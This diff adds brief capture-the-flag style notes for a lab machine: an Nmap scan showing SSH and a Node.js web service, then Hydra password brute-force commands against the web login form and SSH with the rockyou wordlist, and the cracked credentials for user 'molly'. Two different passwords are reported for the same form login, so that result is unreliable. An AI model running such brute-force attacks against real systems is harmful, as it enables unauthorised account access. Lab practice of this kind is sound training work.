@@ -1,0 +1,24 @@
+### NMAP 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 00:33 -03
+Nmap scan report for 10.10.121.240 (10.10.121.240)
+Host is up (0.23s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Node.js Express framework
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.65 seconds
+
+### HYDRA
+hydra -l molly -P ~/Downloads/rockyou.txt 10.10.121.240 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+Resultado HYDRA
+[80][http-post-form] host: 10.10.121.240   login: molly   password: futbol
+[80][http-post-form] host: 10.10.121.240   login: molly   password: dragoste
+
+hydra -l molly -P ~/Downloads/rockyou.txt 10.10.120.51  ssh
+
+[22][ssh] host: 10.10.120.51   login: molly   password: butterfly
+
